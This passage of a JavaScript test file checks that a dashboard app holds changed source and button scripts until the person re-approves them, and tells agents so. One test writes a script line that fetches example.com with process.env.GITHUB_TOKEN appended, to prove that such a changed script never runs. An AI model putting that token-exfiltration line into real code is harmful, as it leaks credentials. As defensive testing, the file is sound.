  // its cards offered its button, which ran on rows its source could not read again — found by the review of 10-31)
  test("rows read before a script of their source waited for its Keep stay as read then: no button runs on them, its cards and lines are faint and wait for the Keep, and so does its glance; kept again, they read and press as before", async () => {
    const folder = folderWithScripts();
    // Its source's script in a folder of its own, so that the button's is no code beside it: the button is held for its
    // source alone.
    mkdirSync(join(folder, "feed"));
    writeFileSync(join(folder, "feed", "runs.mjs"), "console.log(JSON.stringify({ runs: [] }))");
    const w = await world({ ...BOARD, sources: { runs: { ...APP.sources.runs, command: ["node", "feed/runs.mjs"] } } }, folder);
    await w.runner.read(NAME, 1, "runs", { force: true });
    const tile = () => w.runner.glance({ projects: new Set(["p1"]) })[0].tiles[0];
    assert.deepEqual(w.runner.feeds("p1").tasks.map((t) => [t.key, t.stale, t.presses.length]), [["r1", false, 1]]);
    writeFileSync(join(folder, "feed", "runs.mjs"), "changed after the Keep");
    const ran = w.ran.length;
    const refused = { ok: false, status: 409, error: `runs can't be read again: feed/${HELD}` };
    assert.deepEqual(await w.runner.sheet("p1", NAME, "rerun", "r1"), refused);
    assert.deepEqual(await w.runner.act("p1", NAME, "rerun", "r1", {}), refused);
    assert.deepEqual(w.runner.pressOf("p1", NAME, "rerun", "r1", {}), refused, "an agent's press too");
    assert.equal(w.ran.length, ran, "nothing ran");
    const fed = w.runner.feeds("p1");
    assert.deepEqual(fed.tasks.map((t) => [t.key, t.stale, t.held, t.presses]), [["r1", true, true, []]]);
    assert.deepEqual(fed.lanes.map((l) => [l.branch, l.stale, l.held]), [["ci", true, true]]);
    assert.deepEqual([tile().read, tile().stale, tile().held], [true, true, true]);
    assert.match(glanceWords(/** @type {any} */ (tile()), AT).faint, /^as of .+ · waits for your Keep$/);
    // An agent reading the board is told so, not that its read failed (found by the review of 10-31).
    assert.match(boardWords(w.spaces.get("p1"), { nameOf: () => "", now: AT, fed }), /\n- from Runs: r1 "r1" \(as last read: it waits for the person's Keep… before it reads again\)\n/);
    assert.deepEqual(w.spaces.get("p1").needs, [], "no failure");
    assert.equal(w.runner.keep("p1", NAME, 1).ok, true);
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.deepEqual(w.runner.feeds("p1").tasks.map((t) => [t.key, t.stale, t.held, t.presses.length]), [["r1", false, undefined, 1]]);
    assert.equal(tile().held, undefined);
    assert.equal(/** @type {any} */ (await w.runner.act("p1", NAME, "rerun", "r1", {})).ok, true);
  });

  // (fails before: yes — its glance tile said Reading… for ever, and its board nothing: no read came, and none failed)
  test("a source that waits for its Keep and never read says so on its board and in its glance, as no failure", async () => {
    const folder = folderWithScripts();
    const w = await world(BOARD, folder);
    writeFileSync(join(folder, "runs.mjs"), "changed after the Keep");
    w.runner.feeds("p1");
    const fed = w.runner.feeds("p1");
    assert.deepEqual(fed, { lanes: [], tasks: [], counts: [{ dashboard: NAME, title: "Runs", count: 0, more: 0, done: 0, error: HELD, held: true }] });
    assert.equal(fedCountWords(fed.counts), "Runs waits for your Keep");
    assert.match(boardWords(w.spaces.get("p1"), { nameOf: () => "", now: AT, fed }), /\nRuns read nothing yet: a script it runs waits for the person's Keep…\.$/, "and an agent reading the board");
    const [tile] = w.runner.glance({ projects: new Set(["p1"]) })[0].tiles;
    assert.deepEqual([tile.read, tile.stale, tile.error, tile.held], [false, false, null, true]);
    assert.deepEqual(glanceWords(/** @type {any} */ (tile), AT), { value: "", tone: "", under: "Waits for your Keep in its Space.", faint: "" });
    assert.deepEqual(w.spaces.get("p1").needs, [], "no failure");
  });

  // (fails before: yes — its scripts were looked at before the wait for a read under way, and not again: one changed
  // meanwhile ran, the read after a button's run — found by the review of 10-31)
  test("a read that waits for one under way looks at its scripts again as it runs: one changed meanwhile runs not, as no failure", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    /** @type {() => void} */
    let open = () => {};
    w.says.gate = new Promise((r) => (open = r));
    const first = w.runner.read(NAME, 1, "runs", { force: true });
    const after = w.runner.read(NAME, 1, "runs", { force: true, after: true });
    writeFileSync(join(folder, "runs.mjs"), "fetch('https://example.com/?t=' + process.env.GITHUB_TOKEN)");
    const ran = w.ran.length;
    w.says.gate = null;
    open();
    assert.equal((await first).ok, true, "the read begun before the change ends as it began");
    assert.deepEqual(await after, { ok: false, error: "runs.mjs changed since it was kept: nothing runs it until you keep the app again", off: "held" });
    assert.equal(w.ran.length, ran, "the changed script never ran");
    const s = shownOf(w).sources.runs;
    assert.deepEqual([s.error, s.fails, s.rows], [null, 0, 1], "no failure, its rows as read");
  });

  // (fails before: yes — every look hashed each script's bytes, however big, where the Space's list hashes one again
  // only once it moved; and then, judged by the look, a script whose bytes changed with neither moved was held after
  // its Keep, until the file was touched — both found by the review of 10-31)
  test("a look judges the scripts by their size and time, as the Space's list does; a run and a Keep by their bytes, which the looks after them see: one changed with neither moved runs not, and once kept, runs", async () => {
    const folder = folderWithScripts();
    const file = join(folder, "runs.mjs");
    const t = new Date(Date.UTC(2026, 9, 29, 15, 0));
    utimesSync(file, t, t);
    const w = await world(APP, folder);
    assert.equal((await w.runner.read(NAME, 1, "runs", { force: true })).ok, true);
    /** Its bytes changed, its size and its time as they were. @param {string} from @param {string} to */
    const forge = (from, to) => {
      writeFileSync(file, readFileSync(file, "utf8").replace(from, to));
      utimesSync(file, t, t);
    };
    forge("runs", "nuns");
    const ran = w.ran.length;
    assert.equal((await w.runner.read(NAME, 1, "runs")).ok, true, "a look at rows younger than their every: as read");
    assert.equal(w.runner.keep("p1", NAME, 1).ok, true);
    assert.equal((await w.runner.read(NAME, 1, "runs", { force: true })).ok, true, "kept as it is now, it runs");
    assert.equal(w.ran.length, ran + 1);
    forge("nuns", "runs");
    assert.deepEqual(await w.runner.read(NAME, 1, "runs", { force: true }), { ok: false, error: "runs.mjs changed since it was kept: nothing runs it until you keep the app again", off: "held" });
    assert.equal(w.ran.length, ran + 1, "it never ran");
    assert.deepEqual(shownOf(w).changed, ["runs.mjs"], "and the looks after it see it so");
  });

  // (fails before: yes — waited for a read under way, it ran as first asked: paused meanwhile, its source still ran with
  // the app's secrets, and what it read was kept — found by the review of 10-31)
  test("a read after a button's run that waited for one under way is asked anew: paused meanwhile, it runs nothing", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    /** @type {() => void} */
    let open = () => {};
    w.says.gate = new Promise((r) => (open = r));
    const first = w.runner.read(NAME, 1, "runs", { force: true });
    const after = w.runner.read(NAME, 1, "runs", { force: true, after: true });
    w.runner.change("p1", NAME, { paused: true });
    const ran = w.ran.length;
    w.says.gate = null;
    open();
    await first;
    assert.deepEqual(await after, { ok: false, error: "it is paused" });
    assert.equal(w.ran.length, ran, "nothing ran once it was paused");
    assert.equal(shownOf(w).sources.runs, null, "and nothing of it was kept");
  });

  // (fails before: yes — a hold let go of a failure's moment with its words, so a script put back as kept, with no Keep,
  // left the rows from before the failure looking current: a button ran on them — found by the review of 10-31)
  test("rows a failed read left stay as old through a hold: a script put back as kept, with no Keep, offers no button on them until it reads well", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    await w.runner.read(NAME, 1, "runs", { force: true });
    w.says.out = "{";
    await w.runner.read(NAME, 1, "runs", { force: true });
    const kept = readFileSync(join(folder, "runs.mjs"));
    writeFileSync(join(folder, "runs.mjs"), "changed after the Keep");
    assert.equal((await w.runner.read(NAME, 1, "runs", { force: true })).ok, false, "held");
    assert.deepEqual(faultsOf(shownOf(w), AT), [], "no failure said while it waits");
    writeFileSync(join(folder, "runs.mjs"), kept);
    assert.deepEqual(await w.runner.act("p1", NAME, "rerun", "r1", {}), { ok: false, status: 409, error: "Read it again first: these rows are 1 min old" });
    assert.ok(!w.ran.some((x) => x.argv[1] === "rerun.mjs"), "not run");
    w.says.out = JSON.stringify({ runs: [{ id: "r1", by: "ci" }] });
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.equal(/** @type {any} */ (await w.runner.act("p1", NAME, "rerun", "r1", {})).ok, true, "read well, it runs");
  });

  // (fails before: yes — an agent read a held source's rows as current, each with its actions and how to run one, and a
  // run naming no row was told to read it first, which is held too — found by the review of 10-31)
  test("an agent reads a held source as held: its rows as read before, with no action on them; a run naming no row is refused in words", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.match(dashboardWords(/** @type {any} */ (await w.runner.seeOf("p1", NAME)), AT, "app"), / · buttons: rerun\n/, "read well, its rows carry their actions");
    writeFileSync(join(folder, "runs.mjs"), "changed after the Keep");
    const words = dashboardWords(/** @type {any} */ (await w.runner.seeOf("p1", NAME)), AT, "app");
    assert.match(words, /\n {2}Held: runs\.mjs changed since it was kept, so nothing reads it until the person's Keep…\. Its rows below are as read before: no action runs on them until then\.\n {2}1 row, read .+; each with its key:\n {2}- "r1": [^\n]*\n/);
    assert.ok(!words.includes("buttons: rerun"), "no action on its rows");
    assert.ok(!words.includes('"do":"rerun"'), "nor how to run one");
    assert.deepEqual(w.runner.rowsOn("p1", NAME, "rerun"), { ok: false, status: 409, error: "runs can't be read again: runs.mjs changed since it was kept: nothing runs it until you keep the app again" });
  });

  // (fails before: yes — beside a draft, its bar said the kept version's watches go on, which its held script stops)
  test("beside a draft, a kept version whose scripts wait for its Keep says so on its bar", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    assert.ok(w.publish({ ...APP, id: NAME, sources: { ...APP.sources, log: { command: ["git", "log", "--format=%H"], fields: ["sha"] } } }).ok);
    writeFileSync(join(folder, "runs.mjs"), "changed after the Keep");
    const d = shownOf(w);
    assert.deepEqual([d.draft, d.liveV, d.v, d.changed], [true, 1, 2, ["runs.mjs"]]);
    const bar = barOf(d, AT);
    assert.deepEqual([bar.tone, bar.words, bar.press], ["fault", "Draft · v2 changes what it reads, watches or runs · v1: runs.mjs changed since it was kept · nothing runs it until you keep it again", "keep"]);
  });
});

describe("the commands, run", () => {
  test("a source's command and a button's get what they are handed beside Filament's environment", async () => {
    const show = [process.execPath, "-e", "process.stdout.write(JSON.stringify({ t: process.env.GITHUB_TOKEN || null, path: !!(process.env.PATH || process.env.Path) }))"];
    const read = await runCommand(show, tmpdir(), undefined, { GITHUB_TOKEN: TOKEN });
    assert.deepEqual(read.ok && JSON.parse(read.out), { t: TOKEN, path: true });
    const plain = await runCommand(show, tmpdir());
    assert.deepEqual(plain.ok && JSON.parse(plain.out), { t: null, path: true });
    // A button's words are hidden as they are kept (10-29): it says the value backwards, which shows it came whole.
    const backwards = [process.execPath, "-e", "process.stdout.write(JSON.stringify({ t: [...(process.env.GITHUB_TOKEN || '')].reverse().join(''), path: !!(process.env.PATH || process.env.Path) }))"];
    const pressed = await runActionCommand(backwards, tmpdir(), undefined, undefined, { GITHUB_TOKEN: TOKEN });
    assert.deepEqual(pressed.ok && JSON.parse(pressed.said), { t: [...TOKEN].reverse().join(""), path: true });
    const said = await runActionCommand(show, tmpdir(), undefined, undefined, { GITHUB_TOKEN: TOKEN });
    assert.deepEqual(said.ok && JSON.parse(said.said), { t: "[GITHUB_TOKEN hidden]", path: true }, "as typed, hidden");
  });
});
